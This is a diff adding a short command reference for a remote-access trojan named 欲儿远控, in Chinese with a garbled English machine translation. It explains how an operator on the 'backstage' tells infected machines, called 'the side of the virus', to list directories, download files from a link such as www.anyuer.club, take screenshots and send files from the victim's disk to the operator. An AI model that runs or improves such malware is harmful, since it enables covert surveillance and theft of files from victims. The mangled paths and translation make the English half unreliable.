@@ -1,0 +1,29 @@
+关于欲儿远控的说明
+
+
+命令大全 
+
+dir-查询目录（查询对方指定路径的文件）——例如：dir-D:\\
+down-下载链接-保存路径（让对方下载指定链接的文件）——例如：down-http://www.anyuer.club-D:\\index.ph
+screen-保存路径（截取对方的屏幕）——例如：screen-D:\\001.jpg
+pass-对面硬盘文件路径-你自己保存的文件路径（让对方文件传输至你的电脑）——例如：pass-D:\\001.jpg-E:\\002.jpg
+
+以上《对方》是指中病毒的那一边。《自己》是指后台管理者
+
+
+
+
+Explanation on remote control of desire
+
+Linux
+
+Dir - Query directories (queries for files with specified paths) for example: dir-D:.\\
+
+Down-Download Link-Save Path (Let the other party download the file with the specified link) -- For example, down-http://www.anyuer.club-D:\index.ph
+
+Screen-save path (intercepting each other's screen) -- for example: screen-D:\\\ 001.jpg
+
+Pass-to-Face Hard Disk File Path-File Path saved by yourself (let the other party file transfer to your computer) -- e.g. pass-D:\\\\\\\\\ 001.jpg-E:\\\ 2002.jpg
+
+
+The above "other party" refers to the side of the virus. Self refers to backstage managers
